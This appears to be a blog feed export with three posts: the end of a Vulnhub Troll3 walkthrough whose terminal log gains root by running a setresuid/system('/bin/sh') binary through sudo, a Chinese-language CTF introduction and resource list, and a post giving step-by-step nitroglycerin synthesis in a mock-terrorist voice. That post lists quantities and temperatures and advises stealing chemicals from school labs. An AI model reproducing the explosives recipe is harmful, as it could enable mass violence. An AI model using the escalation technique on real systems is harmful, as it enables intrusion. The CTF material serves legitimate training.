<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maleus@Tr0ll3:~$ ls</span><br><span class="line">dont_even_bother  dont_even_bother.c</span><br><span class="line">maleus@Tr0ll3:~$ gcc dont_even_bother.c -o dont_even_bother</span><br><span class="line">dont_even_bother.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">dont_even_bother.c:2:8: warning: implicit declaration of <span class="keyword">function</span> ‘setresuid’ [-Wimplicit-function-declaration]</span><br><span class="line">        setresuid(0, 0, 0);</span><br><span class="line">        ^~~~~~~~~</span><br><span class="line">dont_even_bother.c:3:8: warning: implicit declaration of <span class="keyword">function</span> ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        ^~~~~~</span><br><span class="line">maleus@Tr0ll3:~$ sudo /home/maleus/dont_even_bother</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwed</span></span><br><span class="line">/bin/sh: 3: pwed: not found</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/maleus</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt  </span></span><br><span class="line">You are truly a Jedi!</span><br><span class="line"></span><br><span class="line">Twitter Proof:</span><br><span class="line"></span><br><span class="line">Pr00fThatTh3L33tHax0rG0tTheFl@g!!</span><br><span class="line"></span><br><span class="line">@Maleus21</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub239.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>aircrack-ng破解.cap包密码</li>
<li>nginx用户代理</li>
<li>lynx浏览器使用</li>
<li>使用ssh RSA密钥登录ssh</li>
<li>.viminfo文件泄露密码</li>
<li>setresuid(0, 0, 0) c语言脚本提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>all-things-about-ctf</title>
    <url>/2020/08/17/all-about-ctf/</url>
    <content><![CDATA[<h1 id="ctf基础"><a href="#ctf基础" class="headerlink" title="ctf基础"></a>ctf基础</h1><h2 id="ctf简介"><a href="#ctf简介" class="headerlink" title="ctf简介"></a>ctf简介</h2><p>CTF（Capture The Flag，夺旗赛）起源于 1996 年 DEFCON 全球黑客大会，是网络安全爱好者之间的竞技游戏，也是黑客的游戏。</p>
<p>CTF 竞赛涉及众多领域，内容繁杂。与此同时，安全技术的发展速度越来越快，CTF 题目的难度越来越高，初学者的门槛也越来越高。</p>
<p>DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p>
<p>CTF 为团队赛，通常以三人为限，要想在比赛中取得胜利，就要求团队中每个人在各种类别的题目中至少精通一类，三人优势互补，取得团队的胜利。同时，准备和参与 CTF 比赛是一种有效将计算机科学的离散面、聚焦于计算机安全领域的方法。</p>
<p>ctf比赛有难有易，比赛内容一般是拿到系统最高权限，然后在root或administrator路径下面找到flag并提交，有时flag会利用各种手段隐藏起来。除此之外还有各种密码破解，逆向，缓冲区溢出，追踪溯源，信息破译，文件提权等等各种脑洞大开的题目。</p>
<p>一场好的ctf比赛非常锻炼参赛者的渗透攻击与知识水平。</p>
<p><font color="yellow">CTF精神与内涵</p>
<ul>
<li>技术应该以开放的方式共享。</li>
<li>在高速发展，日新月异的现代社会，安全攻防技术总是保持不断更新，旧的技术在面对新的技术时随时可能失效，所以作为normal man，必须要有一个不断学习的思想，才能不被社会淘汰。</li>
</ul>
</font>

<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ctf1.jpg"></p>
<h2 id="ctf竞赛模式"><a href="#ctf竞赛模式" class="headerlink" title="ctf竞赛模式"></a>ctf竞赛模式</h2><ul>
<li>解题模式</li>
</ul>
<p>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别</p>
<ul>
<li>攻防模式（Attack-Defense）</li>
</ul>
<p>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</p>
<ul>
<li>混合模式（mix）</li>
</ul>
<p>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。</p>
<h2 id="ctf题目类别"><a href="#ctf题目类别" class="headerlink" title="ctf题目类别"></a>ctf题目类别</h2><ul>
<li>WEB（网络安全）</li>
</ul>
<p>WEB是CTF竞赛的主要题型，题目涉及到许多常见的WEB漏洞，诸如XSS、文件包含、代码执行、上传漏洞、SQL注入，以及各种新曝出的web漏洞。也有一些简单的关于网络基础知识及编程脚本编写的考察。例如返回包、TCP-IP、数据包内容和poc的构造。可以说题目环境比较接近真实环境。</p>
<p><font color="green">所需知识：PHP,python,TCP-IP,SQL,以及各种web漏洞</font></p>
<ul>
<li>MISC（安全杂项）</li>
</ul>
<p>MISC即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。</p>
<p><font color="green">所需知识：常见隐写术工具、wireshark等流量审查工具、编码知识。<br></font></p>
<ul>
<li>Crypto（密码学）</li>
</ul>
<p>题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，和加解密python脚本的编写。主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。</p>
<p><font color="green">所需知识：矩阵、数论、古典密码学</font></p>
<ul>
<li>Reverse（逆向工程）</li>
</ul>
<p>题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。主要考查参赛选手的逆向分析能力。</p>
<p><font color="green">所需知识：汇编语言、加密与解密、常见反编译工具</font></p>
<ul>
<li>PPC（编程类题目）</li>
</ul>
<p>题目涉及到程序编写、编程算法实现，当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。题目较少，一般与其他类型相结合。</p>
<p><font color="green">所需知识：基本编程思路、C,C++,Python,php皆可。</font></p>
<ul>
<li>PWN（二进制安全）</li>
</ul>
<p>PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。主要考察参数选手对缓冲区溢出漏洞的利用能力及绕过软件保护机制的能力。</p>
<p><font color="green">所需知识：C，OD+IDA，数据结构，操作系统，常见逆向工具。</font></p>
<ul>
<li>IOT(物联网安全)</li>
</ul>
<p>随着人工智能物联网的发展，各种IOT设备的安全性也变的越来越重要。各种硬件设备的固件也能被逆向并挖掘出各种漏洞。此题主要考察固件的提取和逆向分析，及缓冲区溢出漏洞的利用，及python脚本的编写。</p>
<p><font color="green">所需知识：固件分析，静态分析，动态仿真/模拟，漏洞挖掘，fuzzing</font></p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSDRsby9wLzExNzIxOTMyLmh0bWw=">IOT 安全资料整合-主要是路由器<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSDRsbw==">IOT优秀博客推荐<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<h2 id="顶级ctf比赛介绍"><a href="#顶级ctf比赛介绍" class="headerlink" title="顶级ctf比赛介绍"></a>顶级ctf比赛介绍</h2><p>详见: <a href="ctftime.org">ctftime</a></p>
<h3 id="Pwn2Own"><a href="#Pwn2Own" class="headerlink" title="Pwn2Own"></a>Pwn2Own</h3><p>Pwn2Own是一个计算机黑客挑战赛。从2007年开始，每年都会在CanSecWest安全会议上举行。参赛者面临的挑战是从广泛使用的软件和移动设备中找出未发现的漏洞。</p>
<ul>
<li>世界最难的黑客挑战赛</li>
<li>针对主流浏览器的远程攻击</li>
<li>要求沙箱逃逸</li>
</ul>
<p>Pwn2Own攻击目标包括IE、Chrome、Safari、Firefox、Adobe Flash和Adobe Reader的最新版本。对安全研究人员来说，如果能在Pwn2Own上获奖，这象征着其安全研究水平已经达到世界领先的水平。Pwn2Own上各参赛团队的表现，也代表其国家网络攻防技术的实力。</p>
<p>参赛hacker们的目标是4大主流网页浏览器——IE、Firefox、Chrome和Safari，平台是在安装安全更新的Windows 7操作系统下运行，Safari浏览器将在安装苹果Mac OS X 10.6雪豹操作系统下运作，顺利攻破一个主流浏览器便奖励1万美元，共4万美元。为了增加比赛难度，参加黑客竞赛的参赛者不准使用Adobe Flash等第三方外挂。这些第三方外挂一直都是操作系统中的安全弱项，破解专家Charlie Miller说只要浏览器装有Java或 Adobe Flash，被黑简直是稀松平常。</p>
<h3 id="CyberGrandChallenge"><a href="#CyberGrandChallenge" class="headerlink" title="CyberGrandChallenge"></a>CyberGrandChallenge</h3><ul>
<li>机器人的CTF攻防比赛</li>
<li>自动化漏洞挖掘、漏洞利用、程序分析、程序补丁</li>
</ul>
<p>2016年8月在美国拉斯维加斯举办的 Defcon CTF，一支名为 Mayhem 的机器人战队与另外十四支人类顶尖CTF战队上演了信息安全领域首次人机黑客对战。该事件在人工智能和信息安全领域具有里程碑式的意义，是机器智能开始深入影响信息安全的标志性事件之一。代表机器智能的 Mayhem，正是由美国国防部先进项目研究局（DARPA，Defense Advanced Research Projects Agency）举办的网络超级挑战赛（CGC，Cyber Grand Challenge）的冠军。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYTNrNGgzZC50b3AvMjAxOC8xMS8wMS9DR0Mv">CFE-比赛内容参考<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="DEFCON-CTF"><a href="#DEFCON-CTF" class="headerlink" title="DEFCON CTF"></a>DEFCON CTF</h3><p>CTF赛事中的“世界杯”</p>
<h3 id="Codegate-CTF-and-Secuinside-CTF"><a href="#Codegate-CTF-and-Secuinside-CTF" class="headerlink" title="Codegate CTF and Secuinside CTF"></a>Codegate CTF and Secuinside CTF</h3><p>韩国首尔“大奖赛”，冠军奖金3000万韩元</p>
<h3 id="XXC3-CTF"><a href="#XXC3-CTF" class="headerlink" title="XXC3 CTF"></a>XXC3 CTF</h3><p>欧洲历史最悠久CCC黑客大会举办的CTF</p>
<h3 id="RuCTF"><a href="#RuCTF" class="headerlink" title="RuCTF"></a>RuCTF</h3><p>由俄罗斯Hackerdom组织，解题模式资格赛面向全球参赛，解题攻防混合模式的决赛面向俄罗斯队伍的国家级竞赛</p>
<h3 id="Realworld-CTF比赛中的0day"><a href="#Realworld-CTF比赛中的0day" class="headerlink" title="Realworld CTF比赛中的0day"></a>Realworld CTF比赛中的0day</h3><ul>
<li>参考</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vZmV2ZW50cy8yMTc4MDQuaHRtbA==">在CTF比赛中发现的PHP远程代码执行0day漏洞<i class="fa fa-external-link-alt"></i></span></p>
<p><strong><em>可见现在技术竞争的激烈程度</em></strong></p>
<h2 id="ctf比赛资源及书籍整理"><a href="#ctf比赛资源及书籍整理" class="headerlink" title="ctf比赛资源及书籍整理"></a>ctf比赛资源及书籍整理</h2><p><font color="red">学习ctf没有其它方法，就是刷题，刷到形成肌肉记忆，百炼成钢。。。</font></p>
<h3 id="ctf靶场推荐"><a href="#ctf靶场推荐" class="headerlink" title="ctf靶场推荐"></a>ctf靶场推荐</h3><ul>
<li>中级难度</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20v">vulnhub<i class="fa fa-external-link-alt"></i></span></p>
<p>vulnhub上有将近350个已经由大神们打包制作好的各种类型的ctf靶场镜像及虚拟机文件，可以直接打包下载下来安装就能使用，其中的机器大部分是初到中级的难度，不过也有个别特别难的机器，考察缓冲区溢出漏洞利用及绕过软件安全保护机制等等。此平台主要是OSCP备考者练习的首选。当然也可以训练ctf。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaWNodW5xaXUuY29tL2JhdHRhbGlvbg==">i春秋-CTF大本营<i class="fa fa-external-link-alt"></i></span></p>
<p>i春秋的，里面都是些经典的题目，适合训练用。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYuaGFja2VyMTAxLmNvbS8=">Hacker101 CTF<i class="fa fa-external-link-alt"></i></span></p>
<p>hackerone的ctf</p>
<ul>
<li>中级偏高级难度</li>
</ul>
<p>wargame推荐</p>
<p>1.漏洞挖掘与利用</p>
<p><span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3Iv">pwnable<i class="fa fa-external-link-alt"></i></span></p>
<p>pwn平台</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9pby5uZXRnYXJhZ2Uub3JnLw==">IO wargame<i class="fa fa-external-link-alt"></i></span></p>
<p>逆向pwn平台</p>
<p>2.逆向工程与软件破解</p>
<p><span class="exturl" data-url="aHR0cDovL3JldmVyc2luZy5rci8=">reversing.kr<i class="fa fa-external-link-alt"></i></span></p>
<p>This site tests your ability to Cracking &amp; Reverse Code Engineering</p>
<p>3.web渗透</p>
<p><span class="exturl" data-url="aHR0cDovL3dlYmhhY2tpbmcua3Iv">webhacking<i class="fa fa-external-link-alt"></i></span></p>
<p>web challenges</p>
<p><span class="exturl" data-url="aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=">xss-game平台<i class="fa fa-external-link-alt"></i></span></p>
<p>xss游戏练级平台</p>
<p>4.综合类</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9vdmVydGhld2lyZS5vcmcvd2FyZ2FtZXMv">Wargames<i class="fa fa-external-link-alt"></i></span></p>
<p>OverTheWire社区提供的wargame可以通过充满乐趣的游戏形式帮助学习和实践安全攻击方法。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93M2NoYWxscy5jb20v">w3challs.com<i class="fa fa-external-link-alt"></i></span></p>
<p>unique challenges running in a real world environment, with no guessing and no simulation! pop some shells.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jaGFsbC5zdHlwci5jb20vP2NoYWxs">Stereotyped Challenges<i class="fa fa-external-link-alt"></i></span></p>
<p>a lot of advanced web-based exploitation techniques and improve your offensive skills.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wZW50ZXN0ZXJsYWIuY29tLw==">pentesterlab<i class="fa fa-external-link-alt"></i></span></p>
<p>主要是关于web漏洞方面的，很多比较新的web漏洞，oscp备考训练平台。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9pZDAtcnNhLnB1Yi8=">id0-rsa.pub<i class="fa fa-external-link-alt"></i></span></p>
<p>密码学和各种加解密算法训练平台</p>
<h3 id="ctf搭建平台推荐"><a href="#ctf搭建平台推荐" class="headerlink" title="ctf搭建平台推荐"></a>ctf搭建平台推荐</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhY2Vib29rL2ZiY3Rm">fbctf<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Facebook CTF平台，可举办“Jeopardy”和“King of the Hill”风格的“夺旗”比赛。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NURmQvQ1RGZA==">CTFd<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>CTFd是can中的“Capture The Flag”。使用插件和主题进行自定义很容易，并且拥有运行Jeopardy风格的CTF所需的一切。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NsaWZmZS9TZWNHZW4=">SecGen<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>SecGen创建易受攻击的虚拟机，以便学生可以学习安全渗透测试技术。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">hack the box<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="yellow">这个平台光注册就是一道坎，里面难的机器能难飞天，最容易的机器，要拿下也需要一段时间，质量非常的好，偏向真实环境与攻击手段，也可以作为oscp考试的训练平台，目前最难的一台机器内容是渗透攻击chrome浏览器的漏洞，可以说是%99贴近真实环境了。涉及各方面知识点，web渗透，内网端口转发，沙箱逃逸，逆向，pwn，缓冲区溢出，windows,linux内网渗透,非常全面。</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ctf2.jpg"></p>
<h3 id="学习ctf的好处"><a href="#学习ctf的好处" class="headerlink" title="学习ctf的好处"></a>学习ctf的好处</h3><ul>
<li>渗透测试网络安全方向的工作</li>
<li>Technology is cool</li>
<li>防止老年痴呆</li>
</ul>
<h3 id="ctf各种学习资源，工具和书籍推荐"><a href="#ctf各种学习资源，工具和书籍推荐" class="headerlink" title="ctf各种学习资源，工具和书籍推荐"></a>ctf各种学习资源，工具和书籍推荐</h3><ul>
<li><a href="https://fdlucifer.github.io/">lUc1f3r11’s blog</a></li>
</ul>
<p>本人的博客，里面各种writeup和工具提权方法都有，以后会更新iot相关的知识，欢迎浏览。。。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2VuZGVjb2Rlcg==">goendecoder<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>本人独立开发的由golang编写的ctf加解密工具，包括ctf常用的各种加解密算法，可以根据实际需要修改源代码进行ctf加解密运算。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ctf3.jpg"></p>
<p>另外本人github上面也有很多fork其他大神的资源，之后还会发布一些实用的golang小工具。</p>
<ul>
<li><a href="https://fdlucifer.github.io/2020/02/13/pwn-resources/">pwn逆向资源以及各种poc收录</a></li>
</ul>
<p>一些pwn逆向资源</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9vcmFuZ2VfODM2MQ==">Orange Tsai<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>曾黑掉facebook的台湾黑客，orange大佬的twitter,也是一名ctf大神</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==">orange大佬的博客<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>墙裂推荐</p>
<p>另外没事可以在twitter上多关注infosec大神的推文，都是干货</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Fwc2RlaGFsL2F3ZXNvbWUtY3Rm">Awesome CTF<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Capture The Flag（CTF）框架，库，资源，软件和教程的精选列表。该列表旨在帮助初学者以及经验丰富的CTF玩家在一个地方找到与CTF相关的所有内容。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FuYXJjaG9UZWNoTllDL21ldGEvd2lraS9JbmZvU2VjI2hhY2tpbmctY2hhbGxlbmdlcw==">InfoSec<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>CTFs and Hacking Games</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3phcmR1cy9jdGYtdG9vbHM=">ctf-tools<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>这是安装脚本的集合，用于创建各种ctf研究工具的安装。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RpZGllclN0ZXZlbnMvRGlkaWVyU3RldmVuc1N1aXRl">DidierStevensSuite<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>python工具脚本大全</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9tZWRpYS5kZWZjb24ub3JnLw==">DEF CON Media Server<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>历代defcon的pdf,ppt,和视频大全</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9uc2VjLmlvL2NvbXBldGl0aW9uLw==">Competition (CTF)<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9uYXRpb25hbGN5YmVybGVhZ3VlLm9yZy8=">The National Cyber League<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9jdGZkLmlvLw==">ctfd<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p>Cyber Security Training made simple With the best Capture The Flag platform</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoZWxscGhpc2gvaWN0Zi1mcmFtZXdvcms=">The iCTF Framework 3.0<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>这是Shellphish用于托管iCTF的框架。2014年在Usenix 3GSE研讨会上发表的一篇论文中对iCTF框架进行了描述。</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3d3MS5tY3BhLXN0bC5vcmcv">mcpa-stl.org<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>又一个ctf web平台</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05ha2lhbWkvbWVsbGl2b3Jh">Mellivora<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Mellivora是用PHP编写的CTF引擎。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1VucmVhbEFrYW1hL05pZ2h0U2hhZGU=">NightShade<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>NightShade是一个简单的安全capture the flag框架，旨在使您自己的比赛尽可能轻松地进行。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Vhc3ljdGYvbGlicmVjdGY=">LibreCTF<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>LibreCTF是用于运行CTF（夺旗）比赛的框架。该项目以前被称为OpenCTF，以用于运行EasyCTF的平台命名，但此后被重写为Rust。因此，它是在考虑性能的前提下制作的，同时还旨在尽可能地灵活。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9nb29nbGUtY3Rm">Google CTF<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>该存储库列出了Google CTF 2017-2019中使用的大多数挑战以及可用于运行这些挑战的大多数基础结构。重要信息-2017、2018和2019文件夹中的代码具有未修复的安全漏洞。这些是故意存在的，并且在实际的生产基础结构上运行它们并不安全。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9jdGZzY29yZWJvYXJk">ctfscoreboard<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>这是基本的CTF记分板，支持团队或个人竞争对手，以及其他一些功能。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NsaWZmZS9TZWNHZW4=">Security Scenario Generator (SecGen)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>SecGen会创建易受攻击的虚拟机，实验室环境和黑客挑战，因此学生可以学习安全渗透测试技术。诸如Metasploitable2之类的框始终是相同的，该项目使用Vagrant，Puppet和Ruby创建随机易受攻击的虚拟机，可用于学习或托管CTF事件。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tvcm9tb2Rha28vbWtjdGY=">mkCTF<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>该框架旨在帮助您的团队遵循一种格式，在CTF基础结构上实现高效集成和部署，从而提出CTF挑战。该项目最初是为管理INS’hAck 2017事件的挑战而创建的。可以在此存储库中找到INS’hAck过去版本的挑战和文章。这个项目不断发展，以在基于Rancher的基础架构上部署挑战时实现更高的自动化程度。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0ZnM=">CTFs<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>各种ctf资源及writeup合集</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tLw==">blackhat官网<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>blackhat官网</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVmY29uLm9yZy8=">www.defcon.org<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>defcon官网</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9oYWNreG9yLm5ldC8=">hackxor<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Hackxor是一款逼真的Web应用程序黑客游戏，旨在帮助各种能力的玩家发展自己的技能。所有任务均基于进行笔试，漏洞赏金狩猎和研究时亲自发现的真实漏洞。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ctf4.jpg"></p>
<p><font color="blue">更多欢迎继续补充。。。</font></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>炸药制造(deep web)</title>
    <url>/2019/02/06/bomb-deep-web/</url>
    <content><![CDATA[<h3 id="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："><a href="#从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：" class="headerlink" title="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："></a>从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：</h3><p><strong><em>原料:</em></strong><font color="red">滴管，玻璃杯两个，碳酸钠（俗称苏达），浓硝酸，浓硫酸，甘油，这些都能在化学药品商店买到，当然为了避免暴露身份，比较推荐的方法是到中学化学实验室里面去偷，一盆水，不需要太满，一个搪瓷茶缸，最好还有温度计，注意家里用来量体温的温度计是不能用的，一是量程不够用，二来是体温计的特性在温度到达最高点之后除非用手甩，否则水银柱不会下降，那么您很有可能就此为了伟大事业献身。最后推荐ph试纸，当然可以用普通酸碱指示剂替代。</font></p>
<a id="more"></a>

<p><strong><em>步骤:</em></strong></p>
<p>1、在一个玻璃杯中加上大概80毫升的水</p>
<p>2、在另一个玻璃杯中除加上80毫升水外，基本添上一平勺碳酸钠，所谓的勺子是指不锈钢的西式餐勺，如果使用中式的汤匙那就差很多了。配成碳酸钠溶液。</p>
<p>3、好,现在是时候将一个搪瓷茶缸放入水盆中了，然后缓慢（注意）加入8~10毫升左右的浓硝酸，用温度计测量温度，要到20度以下。差点忘记说了，冬季可能比较容易，夏秋季节的话，呵呵，那还是准备一些冰块吧。之所以那么低的温度是浓硝酸在高温下分解极快。</p>
<p>4、慢慢地加入22~28毫升的浓硫酸，也要注意，速度慢，温度要保持住，绝不能再高了。有条件使用冰块的还要低一些。5、用滴管把甘油滴到混合物上，速度要慢，每分钟大概4、5滴就差不多了。而且还是那句话，温度绝对不能上升，否则您很容易就去见马克思了。一直要滴到甘油在混合物表面形成甘油层为止。</p>
<p>6、在低温下用筷子搅拌一刻钟。筷子用完以后千万不要再用它吃饭了。完毕后把混合物缓慢倒入蒸馏水的杯子中。硝酸甘油比重较大，会沉底。而且由于折射率的不同，两种液体分层后，两种液体的分界线还是比较容易分辨的。</p>
<p>7、把下层的硝酸甘油滴到碳酸钠溶液中，目的是为了去除多余的酸，因为酸性的硝酸溶液氧化性非常强。是极其危险的。至于够不够到中性，就要依靠您的酸碱指示剂了。</p>
<p>　　制作完了之后，千万要注意不要振荡摇晃。如果那样的话——向毛主席保证，您一定会见到他老人家。如果您想试验一下它的威力的话也不是不可以，通常可以取一个小玻璃药瓶，注满硝化甘油之后，从高楼上任它自由落体，你会明白什么叫做东京轰炸的威力缩小版。</p>
<p>　　另外您要明确一个的概念是，炸药和炸弹是有区别的。瞧，我们手上已经有了炸药，但是它还称不上是一个炸弹。我们辛辛苦苦制造出来的“宝贝”，如果一不小心就会要了我们的命，当然我们恐怖分子并不害怕为了伟大的事业献身，但是壮志未酬身先死未免太可惜了。每天要提心吊胆会多么严重的挫伤我们的积极性啊。</p>
<p>　　下一步的加工首先是要让它变得稳定，通常，稳定硝化甘油的方法少说也有100种，最流行的恐怕就硝酸甘油和硝酸钾、硝化棉、木粉填料、矿脂、活性碳粉混合在一起。当年伟大的诺贝尔先生就是靠这玩意一举成为大富翁，还创立了大名鼎鼎的诺贝尔奖为世界科学作出了巨大的贡献。当然现在我们作为他的后人也不能甘于其后啊。</p>
